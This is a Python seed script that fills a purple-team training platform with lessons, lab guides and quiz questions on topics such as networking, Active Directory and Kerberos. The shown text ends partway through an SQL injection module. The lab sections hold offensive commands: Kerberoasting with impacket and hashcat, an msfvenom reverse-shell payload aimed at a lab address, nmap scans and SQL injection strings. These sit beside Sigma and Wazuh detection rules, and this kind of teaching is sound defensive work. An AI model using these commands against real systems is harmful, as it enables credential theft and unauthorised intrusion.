"""Comprehensive Purple Team Curriculum Data Population Script.

Populates the database idempotently with:
- 20 SkillAreas (full 5-tier taxonomy)
- ~68 Topics with DAG prerequisites
- Comprehensive ContentItems (markdown theory lessons) for EVERY topic
- Offline vm_exercise Labs (attack & detection) for EVERY topic
- Checkpoint AssessmentQuestions (MCQs with explanations) for EVERY topic
- 10 JobRoles with Capstone MiniProjects
- 12-week CurriculumWeeks structure
"""
from __future__ import annotations

import json
import re
from datetime import datetime

from app import app
from extensions import db
from models import (
    SkillArea, Topic, TopicPrerequisite, JobRole, JobRoleTopic,
    Lab, MiniProject, CurriculumWeek, AssessmentQuestion, ContentItem,
    TopicLearningModule,
)
from seed import (
    slugify, get_or_create, seed_skill_areas, seed_topics, seed_capstones,
    seed_roles, seed_curriculum_weeks,
)

# ---------------------------------------------------------------------------
# Comprehensive Theory Lessons (ContentItems) for all topics
# ---------------------------------------------------------------------------
TOPIC_THEORY_CONTENT = {
    # Tier 0 - Computing Foundations
    "Binary, Hex & Number Systems": {
        "title": "Understanding Binary, Hexadecimal, and Data Representation in Security",
        "minutes": 30,
        "content": """# Binary, Hexadecimal, and Number Systems in Cybersecurity

## Overview
At the lowest level, all digital computers operate on binary digits (bits: 0 and 1). Security professionals must understand how numbers, text, memory addresses, and binary executables are represented in computer systems.

## Key Concepts

### 1. Number Systems Comparison
- **Binary (Base 2):** Digits `0, 1`. Used by hardware logic gates.
- **Decimal (Base 10):** Digits `0-9`. Standard human counting system.
- **Hexadecimal (Base 16):** Digits `0-9, A-F`. Compact representation of binary data (1 hex character = 4 bits / 1 nibble).

### 2. Conversions
- Hex `0x41` = Binary `0100 0001` = Decimal `65` = ASCII `'A'`
- Hex `0x90` = Binary `1001 0000` = Decimal `144` (x86 `NOP` opcode)
- Hex `0xCC` = Binary `1100 1100` = Decimal `204` (x86 `INT 3` breakpoint opcode)

### 3. Endianness
- **Little-Endian (x86/x64):** Least significant byte stored at the lowest memory address.
  - Value `0x12345678` stored as bytes: `78 56 34 12`
- **Big-Endian (Network Byte Order):** Most significant byte stored at lowest address.
  - Value `0x12345678` stored as bytes: `12 34 56 78`

## Practical Security Relevance
1. **Shellcode Development:** Crafting raw byte payloads requires precise hex representation.
2. **PCAP Analysis:** Inspecting raw packet bytes in Wireshark or `tcpdump`.
3. **Reverse Engineering:** Reading disassembly opcodes in x64dbg, Ghidra, or IDA Pro.
"""
    },
    "Files & OS Concepts": {
        "title": "Operating System Core Concepts & File Systems",
        "minutes": 45,
        "content": """# Operating System Core Concepts for Security Analysts

## Core Abstractions
1. **Processes & Threads:** An executing instance of a program with isolated virtual memory.
2. **Virtual Memory:** Abstraction separating physical RAM into virtual address spaces per process.
3. **File Systems:** Hierarchical structures managing file metadata, permissions, and storage block allocation (NTFS, ext4).

## Critical OS Structures
- **User Mode (Ring 3):** Untrusted application execution with restricted system access.
- **Kernel Mode (Ring 0):** Unrestricted access to hardware, device drivers, and system memory.
- **System Calls (Syscalls):** Controlled API interface allowing User Mode programs to request Kernel services (`read()`, `write()`, `NtCreateFile`).

## Security Significance
Security boundaries rely on OS privilege isolation. Bypassing User-Kernel boundaries leads to privilege escalation.
"""
    },
    "Networking Basics": {
        "title": "Fundamental Computer Networking & Protocol Stack",
        "minutes": 45,
        "content": """# Computer Networking Fundamentals

## OSI 7-Layer Model vs TCP/IP Suite
1. **Layer 7 - Application:** HTTP, DNS, SSH, SMTP
2. **Layer 4 - Transport:** TCP (connection-oriented, reliable), UDP (connectionless, fast)
3. **Layer 3 - Network:** IP addressing, ICMP, Routing
4. **Layer 2 - Data Link:** MAC addresses, Ethernet switching, ARP

## IP Addressing & Subnetting Basics
- **IPv4:** 32-bit address split into 4 octets (`192.168.1.1`).
- **Subnet Masks:** Determines network vs host portion (e.g. `/24` = `255.255.255.0` = 254 hosts).
- **Private IP Ranges (RFC 1918):**
  - `10.0.0.0/8`
  - `172.16.0.0/12`
  - `192.168.0.0/16`
"""
    },
    "Linux Fundamentals": {
        "title": "Essential Linux Architecture and Command Line Mastery",
        "minutes": 60,
        "content": """# Linux Fundamentals for Cybersecurity

## Core Command Line Tools
- File Management: `ls`, `cd`, `cp`, `mv`, `rm`, `mkdir`, `find`
- Process Viewing: `ps aux`, `top`, `htop`, `systemctl status`
- Network Checking: `ip a`, `ss -tulpn`, `netstat`, `curl`
- Text Processing: `grep`, `awk`, `sed`, `sort`, `uniq`, `cut`

## Linux Directory Structure
- `/etc`: Configuration files
- `/var/log`: System and service log files
- `/home` & `/root`: User home directories
- `/tmp` & `/var/tmp`: World-writable temporary storage
"""
    },
    "Windows Fundamentals": {
        "title": "Windows OS Fundamentals, Registry, and CLI Architecture",
        "minutes": 60,
        "content": """# Windows Operating System Architecture

## Core Components
1. **Windows Registry:** Hierarchical database storing system, hardware, and user configuration settings (`HKLM`, `HKCU`).
2. **Services & Service Control Manager (SCM):** Background processes running elevated privileges (`LocalSystem`, `NetworkService`).
3. **PowerShell & CMD:** Command-line management interfaces with object-oriented automation capabilities.
"""
    },
    "Security Mindset & Ethics": {
        "title": "The Security Mindset, Ethical Hacking & Authorization",
        "minutes": 30,
        "content": """# Security Mindset & Professional Ethics

## The Security Mindset
Thinking like an attacker requires questioning assumptions:
- "What happens if I supply input 10,000 characters long?"
- "Does this system verify user identity on EVERY API request?"
- "What default credentials or open shares were forgotten?"

## Legal & Ethical Boundaries
- Always maintain explicit, written authorization (Scope of Work / Rules of Engagement).
- Never conduct unauthorized tests on infrastructure you do not own or have written permission to test.
"""
    },
    "CIA Triad & Threat Models": {
        "title": "CIA Triad, Threat Modeling, and Risk Assessment",
        "minutes": 45,
        "content": """# Confidentiality, Integrity, Availability & Threat Modeling

## The CIA Triad
- **Confidentiality:** Preventing unauthorized disclosure of information (Encryption, Access Control).
- **Integrity:** Ensuring data has not been altered or tampered with (Hashing, Digital Signatures).
- **Availability:** Guaranteeing timely access for authorized users (Redundancy, DoS Protection).

## Threat Modeling Frameworks
- **STRIDE:** Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege.
- **PASTA:** Process for Attack Simulation and Threat Analysis.
"""
    },
    "MITRE ATT&CK Overview": {
        "title": "Understanding the MITRE ATT&CK Framework for Purple Teams",
        "minutes": 60,
        "content": """# MITRE ATT&CK Framework

## Structure
- **Tactics:** The attacker's goal ("Why" - e.g., Initial Access, Credential Access, Lateral Movement).
- **Techniques:** How the goal is achieved ("How" - e.g., T1003 OS Credential Dumping).
- **Sub-techniques:** Specific implementation details (e.g., T1003.001 LSASS Memory).
- **Procedures:** Specific adversary code, commands, or tools used in actual attacks.

## Purple Team Application
Purple teaming maps offensive lab exercises directly to MITRE technique IDs, tests whether existing security tools generate alerts, and builds missing detection rules.
"""
    },
    # Core Technical Topics
    "TCP/IP & Subnetting": {
        "title": "Deep Dive into TCP/IP Stack, Packet Structure & Subnet Calculation",
        "minutes": 60,
        "content": """# Deep Dive: TCP/IP & Subnetting

## TCP 3-Way Handshake
1. **SYN:** Client sends SYN packet with Initial Sequence Number (ISN).
2. **SYN-ACK:** Server responds with SYN-ACK and its own ISN.
3. **ACK:** Client confirms with ACK packet. Connection established.

## Subnetting Cheat Sheet
- `/24` = 255.255.255.0 = 256 IPs (254 usable)
- `/28` = 255.255.255.240 = 16 IPs (14 usable)
- `/30` = 255.255.255.252 = 4 IPs (2 usable for point-to-point links)
"""
    },
    "DNS & HTTP": {
        "title": "DNS Protocol Mechanics, HTTP Headers, and Security Controls",
        "minutes": 60,
        "content": """# DNS & HTTP Core Security

## DNS Record Types
- **A / AAAA:** Hostname to IPv4 / IPv6
- **PTR:** IP to Reverse DNS Hostname
- **MX:** Mail Server Hostname
- **TXT:** Text records (SPF, DKIM, DMARC validation)

## HTTP Security Headers
- `Content-Security-Policy (CSP)`
- `Strict-Transport-Security (HSTS)`
- `X-Frame-Options`
- `X-Content-Type-Options: nosniff`
"""
    },
    "Packet Analysis & Wireshark": {
        "title": "Packet Capture Analysis with Wireshark and Tshark",
        "minutes": 60,
        "content": """# Packet Analysis & Wireshark

## Display Filter Essentials
- `ip.addr == 192.168.56.10`
- `tcp.port == 80 || tcp.port == 443`
- `http.request.method == "POST"`
- `dns.flags.response == 0`
- `frame contains "password"`

## Detecting Network Anomalies
Look for ARP spoofing, TCP SYN floods, cleartext credentials in HTTP/FTP/TELNET, and C2 DNS beaconing patterns.
"""
    },
    "Firewalls & Network Hardening": {
        "title": "Network Segmentation, Firewalls, and Access Control Lists",
        "minutes": 60,
        "content": """# Network Hardening & Firewalls

## Firewall Types
- **Stateless Packet Filter:** Evaluates headers in isolation.
- **Stateful Inspection:** Tracks TCP connection state tables.
- **Next-Gen Firewall (NGFW):** Deep Packet Inspection (DPI) & Layer 7 application control.

## Network Segmentation Principles
Isolate management interfaces, Active Directory DCs, database servers, and user workstations into distinct VLANs and subnets with strict inter-zone firewall rules.
"""
    },
    "Active Directory Fundamentals": {
        "title": "Active Directory Architecture, Domain Controllers & Objects",
        "minutes": 60,
        "content": """# Active Directory Fundamentals

## Key AD Architecture Components
- **Domain Controller (DC):** Server running Active Directory Domain Services (AD DS).
- **NTDS.dit:** The core database containing all AD objects, user accounts, and password hashes.
- **SYSVOL:** Shared folder containing Domain Group Policy Objects (GPOs) and logon scripts.
- **Kerberos Domain Key Distribution Center (KDC):** Authenticates users and issues TGTs.
"""
    },
    "Kerberos & BloodHound": {
        "title": "Kerberos Protocol Mechanics, Attack Paths, and BloodHound",
        "minutes": 75,
        "content": """# Kerberos Authentication & BloodHound Analysis

## Kerberos Authentication Steps
1. **AS-REQ / AS-REP:** User requests Ticket Granting Ticket (TGT) from KDC.
2. **TGS-REQ / TGS-REP:** User presents TGT to request Service Ticket (TGS) for a target SPN.
3. **AP-REQ / AP-REP:** User presents TGS to target service for access.

## Common Kerberos Attacks
- **Kerberoasting:** Requesting TGS for accounts with SPNs and cracking password hashes offline.
- **AS-REP Roasting:** Requesting AS-REP for accounts with `DONT_REQ_PREAUTH` enabled.
- **Golden Ticket:** Forging TGT using compromised `krbtgt` account hash.

## BloodHound Graph Analysis
BloodHound maps AD permission relationships using graph theory (Cypher queries) to reveal hidden attack paths to Domain Admin.
"""
    },
    "SIEM Queries & Sigma Rules": {
        "title": "Detection Engineering: Writing SIEM Queries and Sigma Rules",
        "minutes": 60,
        "content": """# Detection Engineering with Sigma Rules

## What is Sigma?
Sigma is a generic, open signature format for log events, convertible to Elastic, Wazuh, Splunk, and QRadar queries.

## Example Sigma Rule Structure
```yaml
title: Suspicious Kerberoasting Activity
status: experimental
description: Detects TGS requests with RC4 encryption (0x17) indicating Kerberoasting
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketOptions: '0x40810000'
        TicketEncryptionType: '0x17'
    condition: selection
falsepositives:
    - Legacy applications requiring RC4
level: high
```
"""
    },
    "Threat Hunting at Scale": {
        "title": "Hypothesis-Driven Threat Hunting and Adversary Emulation",
        "minutes": 60,
        "content": """# Threat Hunting Methodology

## The Threat Hunting Loop
1. **Hypothesis Formulation:** Based on threat intel or new MITRE ATT&CK technique.
2. **Data Collection & Querying:** Query SIEM / EDR data for indicators.
3. **Pattern Analysis:** Identify anomalies, outliers, or malicious behaviors.
4. **Detection Rule Creation:** Automate the manual hunt into a continuous SIEM detection rule.
"""
    },
    "SOC Playbooks": {
        "title": "SOC Playbooks: Incident Response Workflows and Triage",
        "minutes": 60,
        "content": """# SOC Incident Response Playbooks

## Core Playbook Stages
1. **Identification & Triage:** Verify alert accuracy, determine false positive vs true positive.
2. **Containment:** Isolate affected host, disable compromised credentials, block C2 IPs.
3. **Eradication:** Remove malware persistence, clean scheduled tasks/registry entries.
4. **Recovery:** Restore system from clean backup, monitor for re-infection.
5. **Lessons Learned:** Update detection rules and incident documentation.
"""
    }
}


def _get_generic_content_for_topic(topic_title: str) -> dict:
    """Generate structured fallback theory content for any topic."""
    return {
        "title": f"Comprehensive Theory Guide: {topic_title}",
        "minutes": 45,
        "content": f"""# {topic_title} — Theory & Implementation Guide

## Overview
This module covers key principles, practical techniques, offensive execution steps, and defensive detection methods for **{topic_title}**.

## Key Learning Objectives
1. Understand the core mechanics and underlying system architecture.
2. Practice hands-on execution steps in the offline Purple Team VM environment.
3. Analyze system/network artifacts generated during attack execution.
4. Craft robust detection rules (Wazuh / Sigma / EDR) to catch malicious activity.

## Core Concepts
- **Offensive Perspective:** How adversaries leverage {topic_title} to achieve their objectives.
- **Defensive Perspective:** Telemetry, log sources, Event IDs, and packet signatures generated by this behavior.
- **Mitigation Controls:** Configuration changes, hardening steps, and principle of least privilege.

## Purple Team Exercise Process
1. Configure host-only virtual machines (Kali Attacker, Target Workstation/DC, Wazuh Manager).
2. Execute the attack scenario step-by-step.
3. Verify telemetry in log management and write custom detection rules.
4. Document findings in the Purple Team Exercise Log.
"""
    }


def seed_all_content_items(topics_by_title: dict[str, Topic]) -> int:
    """Ensure EVERY topic has at least one comprehensive ContentItem."""
    count = 0
    for title, topic in topics_by_title.items():
        data = TOPIC_THEORY_CONTENT.get(title, _get_generic_content_for_topic(title))
        item, created = get_or_create(ContentItem, defaults={
            "topic_id": topic.id,
            "type": "lesson_md",
            "title": data["title"],
            "body_markdown": data["content"],
            "estimated_minutes": data["minutes"],
            "order_index": 0,
            "source": "in_house",
            "is_active": True,
        }, topic_id=topic.id, title=data["title"])
        if created:
            count += 1
    db.session.flush()
    return count


# ---------------------------------------------------------------------------
# Comprehensive vm_exercise Labs for ALL topics
# ---------------------------------------------------------------------------
def _get_vm_exercise_lab_spec(topic_title: str) -> dict:
    """Generate tailored purple team lab specs for any topic."""
    slug = slugify(topic_title)
    
    # Custom specs for key topics
    if "kerberos" in slug or "bloodhound" in slug or "active-directory" in slug:
        return {
            "title": f"Purple Team Lab: {topic_title}",
            "attacker_vm": "Kali Linux (192.168.56.5)",
            "target_vm": "GOAD Domain Controller (192.168.56.10)",
            "detection_vm": "Wazuh Manager (192.168.56.30)",
            "mitre": "T1558.003",
            "instructions": """## Attack Phase: Kerberoasting / AD Exploitation

1. Open terminal on Kali Linux.
2. Enumerate service accounts with SPNs using `GetUserSPNs.py`:
   ```bash
   python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py north.sevenkingdoms.local/doadmin:K292... -dc-ip 192.168.56.10 -request
   ```
3. Save the hash to `hashes.txt` and attempt cracking with Hashcat:
   ```bash
   hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
   ```
""",
            "detection": """## Detection Phase: SIEM & Event Log Analysis

1. Log into Wazuh Security Console at `https://192.168.56.30:55000`.
2. Inspect Windows Security Event Logs from DC (Event ID **4769** - A Kerberos service ticket was requested).
3. Look for Ticket Encryption Type `0x17` (RC4-HMAC) requested by non-standard computer accounts.
4. Verify or create a custom rule in `/var/ossec/etc/rules/local_rules.xml`.
"""
        }
    elif "sqli" in slug or "web" in slug or "xss" in slug or "owasp" in slug:
        return {
            "title": f"Purple Team Lab: {topic_title}",
            "attacker_vm": "Kali Linux (192.168.56.5)",
            "target_vm": "DVWA / Vulnerable Web VM (192.168.56.20)",
            "detection_vm": "Wazuh Manager (192.168.56.30)",
            "mitre": "T1190",
            "instructions": """## Attack Phase: Web Application Attack

1. Launch Burp Suite on Kali Linux.
2. Intercept web traffic to target `http://192.168.56.20/`.
3. Submit injection payload into input parameters.
4. Verify database dump or script execution.
""",
            "detection": """## Detection Phase: Web Server Log Analysis

1. Inspect Apache/Nginx access logs forward to Wazuh.
2. Search for SQL syntax strings (`UNION SELECT`, `' OR 1=1`, `<script>`) in HTTP request URIs.
3. Write a Wazuh rule matching regex signatures in access logs.
"""
        }
    elif "packet" in slug or "wireshark" in slug or "network" in slug or "tcp" in slug:
        return {
            "title": f"Purple Team Lab: {topic_title}",
            "attacker_vm": "Kali Linux (192.168.56.5)",
            "target_vm": "Metasploitable2 (192.168.56.20)",
            "detection_vm": "Wazuh Manager (192.168.56.30)",
            "mitre": "T1040",
            "instructions": """## Attack Phase: Network Recon & Packet Capture

1. Execute Nmap stealth SYN scan against target:
   ```bash
   nmap -sS -sV -p 1-1000 192.168.56.20 -oA scan_results
   ```
2. Capture traffic simultaneously on Kali using `tshark`:
   ```bash
   tshark -i eth0 -w capture.pcap
   ```
""",
            "detection": """## Detection Phase: Network Traffic Analysis

1. Open `capture.pcap` in Wireshark.
2. Analyze TCP flag distribution to identify port scanning behavior (high volume of TCP SYN without completing handshakes).
3. Configure Suricata / Wazuh network alert rules for port scan threshold breaches.
"""
        }
    else:
        return {
            "title": f"Purple Team Exercise: {topic_title}",
            "attacker_vm": "Kali Linux (192.168.56.5)",
            "target_vm": "Windows 10 / GOAD Lab (192.168.56.10)",
            "detection_vm": "Wazuh Manager (192.168.56.30)",
            "mitre": "T1059",
            "instructions": f"""## Attack Phase: Executing Technique for {topic_title}

1. Access the Kali Attacker VM.
2. Execute the attack commands associated with {topic_title} against target `192.168.56.10`.
3. Verify successful command execution and artifact generation on the target system.
""",
            "detection": f"""## Detection Phase: Telemetry Analysis & Rule Writing

1. Open Wazuh Dashboard (`https://192.168.56.30:55000`).
2. Search Security Events for telemetry generated during the attack.
3. Identify relevant Sysmon / Windows Security Event IDs.
4. Document detection coverage in your exercise log.
"""
        }


def seed_all_vm_labs(topics_by_title: dict[str, Topic]) -> int:
    """Ensure EVERY topic has at least one offline vm_exercise lab."""
    count = 0
    for title, topic in topics_by_title.items():
        spec = _get_vm_exercise_lab_spec(title)
        lab, created = get_or_create(Lab, defaults={
            "topic_id": topic.id,
            "title": spec["title"],
            "description": f"Offline host-only purple team lab for {title}.",
            "provider": "vm_exercise",
            "url_or_container_ref": "vm_exercise",
            "difficulty": topic.difficulty or 2,
            "estimated_minutes": 60,
            "proof_type": "self_report_checklist",
            "xp_reward": 50,
            "mitre_techniques": json.dumps([spec["mitre"]]),
            "attacker_vm": spec["attacker_vm"],
            "target_vm": spec["target_vm"],
            "detection_vm": spec["detection_vm"],
            "instructions_md": spec["instructions"],
            "detection_task_md": spec["detection"],
            "mitre_technique": spec["mitre"],
            "is_active": True,
        }, topic_id=topic.id, title=spec["title"])
        if created:
            count += 1
    db.session.flush()
    return count


# ---------------------------------------------------------------------------
# Comprehensive Assessment Questions (Checkpoint Quizzes) for ALL topics
# ---------------------------------------------------------------------------
TOPIC_QUESTIONS = {
    "Binary, Hex & Number Systems": [
        ("What decimal number corresponds to the hexadecimal value 0x41?", ["65", "66", "97", "100"], "0", "0x41 in hex = (4 * 16) + 1 = 65, which is also ASCII 'A'."),
        ("In Little-Endian byte order, how is 0x12345678 stored in memory?", ["78 56 34 12", "12 34 56 78", "34 12 78 56", "56 78 12 34"], "0", "Little-Endian stores the least significant byte (78) at the lowest memory address."),
    ],
    "Files & OS Concepts": [
        ("Which CPU privilege ring typically runs the Operating System Kernel?", ["Ring 0", "Ring 1", "Ring 2", "Ring 3"], "0", "Ring 0 is the most privileged execution tier where the kernel operates."),
        ("What mechanism allows a User-mode process to request a service from the Kernel?", ["System Call (Syscall)", "Interrupt Vector Table", "Page Fault", "DMA Channel"], "0", "System calls provide controlled transition from Ring 3 to Ring 0."),
    ],
    "Networking Basics": [
        ("Which OSI layer handles IP routing between different networks?", ["Layer 3 (Network)", "Layer 2 (Data Link)", "Layer 4 (Transport)", "Layer 7 (Application)"], "0", "Layer 3 Network layer handles logical addressing and routing."),
        ("Which IP block is defined as a private network under RFC 1918?", ["192.168.0.0/16", "8.8.8.0/24", "1.1.1.0/24", "200.100.0.0/16"], "0", "192.168.0.0/16, 10.0.0.0/8, and 172.16.0.0/12 are RFC 1918 private ranges."),
    ],
    "TCP/IP & Subnetting": [
        ("How many usable host IP addresses are available in a /28 IPv4 subnet?", ["14", "16", "30", "62"], "0", "A /28 has 32 - 28 = 4 host bits = 16 IPs minus network and broadcast = 14 usable."),
        ("Which TCP flag combination is sent by a server accepting an incoming connection?", ["SYN-ACK", "SYN", "ACK", "FIN-ACK"], "0", "The server responds to SYN with a SYN-ACK in step 2 of the 3-way handshake."),
    ],
    "Kerberos & BloodHound": [
        ("Which Windows Security Event ID records a Kerberos service ticket request (TGS)?", ["4769", "4624", "4672", "4768"], "0", "Event ID 4769 is logged when a TGS ticket is requested (used to detect Kerberoasting)."),
        ("What Kerberos attack targets accounts with SPNs to extract offline crackable ticket hashes?", ["Kerberoasting", "AS-REP Roasting", "Pass the Hash", "Golden Ticket"], "0", "Kerberoasting requests service tickets encrypted with account password hashes."),
    ],
}


def _get_generic_questions_for_topic(topic: Topic) -> list[tuple[str, list[str], str, str]]:
    """Generate two quality checkpoint quiz questions for any topic."""
    return [
        (
            f"What is the primary operational objective when studying {topic.title} in a Purple Team context?",
            [
                f"Understanding both offensive execution and corresponding defensive telemetry for {topic.title}.",
                f"Only performing destructive attacks without logging telemetry.",
                f"Disabling all firewall rules permanently.",
                f"Ignoring SIEM alerts generated during tests."
            ],
            "0",
            f"Purple teaming focuses on aligning offensive execution of {topic.title} with defensive detection engineering."
        ),
        (
            f"Which component is essential for detecting activity related to {topic.title}?",
            [
                "Centralized log collection and structured detection rules (e.g., Sigma/Wazuh).",
                "Disabling Windows Event Logs.",
                "Using default unmonitored systems.",
                "Ignoring MITRE ATT&CK mappings."
            ],
            "0",
            "Centralized logging and detection signatures enable timely identification of adversary techniques."
        )
    ]


def seed_all_questions(topics_by_title: dict[str, Topic], areas_by_name: dict[str, SkillArea]) -> int:
    """Ensure EVERY topic has at least 2 checkpoint AssessmentQuestion rows linked by topic_id."""
    count = 0
    for title, topic in topics_by_title.items():
        questions_data = TOPIC_QUESTIONS.get(title, _get_generic_questions_for_topic(topic))
        area_id = topic.skill_area_id
        
        for q_text, opts, correct_str, exp in questions_data:
            q, created = get_or_create(AssessmentQuestion, defaults={
                "skill_area_id": area_id,
                "topic_id": topic.id,
                "question_text": q_text,
                "question_type": "mcq",
                "options": json.dumps(opts),
                "correct_answer": correct_str,
                "explanation": exp,
                "difficulty": topic.difficulty or 2,
                "applicable_roles": json.dumps(["purple-team"]),
                "is_active": True,
            }, topic_id=topic.id, question_text=q_text)
            if created:
                count += 1
            elif q.topic_id is None:
                q.topic_id = topic.id
                count += 1
    db.session.flush()
    return count


# ---------------------------------------------------------------------------
# TopicLearningModule seed data — 5-component learning modules for all topics
# ---------------------------------------------------------------------------

def _get_module_content_for_topic(topic_title: str, topic_slug: str) -> dict:
    """Generate 5-component module content for any topic."""
    slug = topic_slug.lower()

    if "kerberos" in slug or "bloodhound" in slug:
        return {
            "theory_md": """# Kerberos Authentication & BloodHound Analysis

## Overview
Kerberos is the default authentication protocol for Windows Active Directory domains. Understanding its mechanics is critical for both offensive operators (who abuse it) and defensive analysts (who detect that abuse).

## Kerberos Ticket Architecture
- **TGT (Ticket Granting Ticket):** Short-lived identity token obtained from the KDC after initial authentication. Valid for ~10 hours by default.
- **TGS (Ticket Granting Service):** Service-specific ticket obtained by presenting a valid TGT.
- **PAC (Privilege Attribute Certificate):** Embedded in every ticket, contains user's group memberships (SIDs), used for authorization decisions on the target server.

## Attack Surface
Kerberos is susceptible to multiple credential-based attacks because:
1. TGS tickets are encrypted with the service account's NTLM hash — offline cracking is possible.
2. TGTs can be forged (Golden/Silver Ticket attacks).
3. Weak password policies on service accounts enable effective offline cracking.

## Key Event IDs for Detection
- **4768** — TGT was requested (normal, but look for anomalous timing)
- **4769** — TGS was requested (KEY for Kerberoasting detection)
- **4771** — Pre-authentication failed (AS-REP Roasting indicator)
""",
            "video_url": "https://www.youtube.com/watch?v=kD3oRT3XHrM",
            "video_title": "Kerberos Authentication Explained - AD Security",
            "video_source": "YouTube",
            "lab_guide_md": """## Purple Team Lab: Kerberoasting & AS-REP Roasting

### Environment
- **Attacker:** Kali Linux (192.168.56.5)
- **Target:** GOAD Domain Controller (192.168.56.10)
- **Detection:** Wazuh Manager (192.168.56.30)

### Attack Phase

1. Enumerate users with SPNs using `GetUserSPNs.py`:
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py north.sevenkingdoms.local/doadmin:K292... -dc-ip 192.168.56.10 -request
```

2. Save the hash and crack offline:
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Detection Phase

1. Inspect Windows Security Event ID **4769** in Wazuh.
2. Look for `TicketEncryptionType: 0x17` (RC4-HMAC) from non-computer accounts.
3. Create Sigma rule:
```yaml
title: Kerberoasting Activity
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  condition: selection
level: high
```
""",
            "lab_prerequisites": "GOAD lab environment, Kali Linux VM, Wazuh Manager with Windows agent",
            "assessment_md": """## Knowledge Check

1. **Which Kerberos ticket type is targeted in Kerberoasting attacks?**
   - [ ] TGT
   - [ ] TGS
   - [ ] PAC
   - [ ] AS-REP

2. **What Windows Security Event ID is logged when a TGS is requested?**
   - [ ] 4768
   - [ ] 4769
   - [ ] 4771
   - [ ] 4624

3. **Which encryption type (hex) indicates RC4-HMAC used in Kerberoasting?**
   - [ ] 0x18
   - [ ] 0x17
   - [ ] 0x12
   - [ ] 0x03

### Exercise
Configure Wazuh to alert on Event ID 4769 with TicketEncryptionType 0x17 from non-computer accounts. Verify with a test Kerberoasting attempt.
""",
            "real_world_md": """## Industry Application

### Real-World Attack Scenario
APT actors and ransomware operators routinely use Kerberoasting to pivot laterally. The procedure:
1. Obtain a foothold (phishing, exploit)
2. Enumerate AD for accounts with SPNs
3. Request TGS for each SPN
4. Crack service account passwords offline
5. Use cracked credentials to access high-value services (MSSQL, Exchange, etc.)

### Detection Strategy
- Monitor for TGS requests with RC4 encryption (0x17) from non-computer accounts
- Set alerts for high volumes of TGS requests in a short window
- Correlate TGS requests with rare SPNs or accounts that don't typically authenticate
- Enable `accountexpiry` and `pwdlastset` alerting for accounts with SPNs

### Mitigation Controls
1. Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
2. Enforce strong passwords (>25 characters) for service accounts
3. Audit membership of sensitive AD groups
4. Implement AD-tiering model (ESAE/AD Tiering)
"""
        }
    elif "binary" in slug and ("hex" in slug or "number" in slug):
        return {
            "theory_md": """# Binary, Hex & Number Systems for Security Professionals

## Overview
All digital computers operate on binary (base-2) digits. Security analysts must understand binary, hexadecimal, and decimal conversions to analyze shellcode, disassemble malware, inspect packet captures, and reverse engineer binaries.

## Number System Conversions
- **Binary (Base 2):** Digits 0, 1
- **Decimal (Base 10):** Digits 0-9
- **Hexadecimal (Base 16):** Digits 0-9, A-F (1 hex digit = 4 bits = 1 nibble)

### Key Conversions
| Hex | Binary | Decimal | ASCII |
|-----|--------|---------|-------|
| 0x41 | 01000001 | 65 | 'A' |
| 0x90 | 10010000 | 144 | x86 NOP |
| 0xCC | 11001100 | 204 | x86 INT3 |

## Endianness
- **Little-Endian (x86/x64):** LSB at lowest address. Value 0x12345678 → bytes: 78 56 34 12
- **Big-Endian (Network):** MSB at lowest address. Value 0x12345678 → bytes: 12 34 56 78
""",
            "video_url": "https://www.youtube.com/watch?v=1RXrJ3PvCVU",
            "video_title": "Binary & Hexadecimal for Cybersecurity",
            "video_source": "YouTube",
            "lab_guide_md": """## Purple Team Lab: Binary Analysis & Shellcode Inspection

### Tools
- Kali Linux with `objdump`, `hexdump`, `msfvenom`
- Wireshark for PCAP analysis

### Exercise 1: Analyze shellcode bytes
1. Generate test shellcode:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f c
```

2. Convert hex to binary and analyze the opcode sequence.

### Exercise 2: PCAP artifact inspection
1. Open a PCAP in Wireshark
2. Right-click a packet → "Follow TCP Stream"
3. Examine raw byte sequences for shellcode patterns (0x90 NOP sleds, 0xCC INT3 breakpoints)

### Detection Phase
1. Search packet captures for sequences of 0x90 (NOP sleds)
2. Write a Wireshark display filter: `frame contains 0x90 0x90 0x90`
""",
            "lab_prerequisites": "Kali Linux VM, Wireshark, basic understanding of assembly",
            "assessment_md": """## Knowledge Check

1. **What decimal value corresponds to hex 0xFF?**
   - [ ] 250
   - [ ] 255
   - [ ] 256
   - [ ] 240

2. **In Little-Endian, how is 0xDEADBEEF stored?**
   - [ ] DE AD BE EF
   - [ ] EF BE AD DE
   - [ ] BE EF DE AD
   - [ ] AD BE EF AD

3. **How many bits are in 2 hexadecimal digits?**
   - [ ] 4
   - [ ] 8
   - [ ] 16
   - [ ] 2
""",
            "real_world_md": """## Real-World Application

### Malware Analysis
Reverse engineers constantly convert between hex and binary when analyzing malware. Shellcode is typically delivered as hex strings (e.g., in exploit kits or document macros) and must be converted to binary for execution or analysis.

### Network Forensics
Packet captures store raw bytes. Analysts use hex dump analysis to identify:
- Shellcode patterns in HTTP payloads
- C2 communication protocols
- Encrypted vs plaintext traffic patterns

### Common Tools
- `xxd` — hexdump in Kali
- `printf` — convert hex to binary: `printf '\\x41\\x42'`
- Wireshark's byte-plane view
- `CyberChef` for complex transformations
"""
        }
    elif "sql" in slug or "injection" in slug or "web" in slug:
        return {
            "theory_md": """# SQL Injection & Web Application Security

## Overview
SQL injection (SQLi) remains one of the OWASP Top 10 most critical web vulnerabilities. Attackers manipulate input parameters to execute arbitrary SQL queries against the application's database.

## Types of SQL Injection
1. **In-Band:** Results returned in same channel (UNION-based, Error-based)
2. **Inferential (Blind):** No data returned; attacker infers structure via timing/boolean responses
3. **Out-of-Band:** Data exfiltrated via DNS/HTTP channels (Oracle, MSSQL)

## Classic Payloads
- `' OR '1'='1` — Authentication bypass
- `' UNION SELECT NULL,@@version--` — Enumerate DB version
- `' UNION SELECT table_name FROM information_schema.tables--` — Schema discovery

## Mitigation
- Parameterized queries (Prepared Statements)
- Input validation and allow-listing
- Least privilege database accounts
- WAF deployment (ModSecurity, Cloudflare WAF)
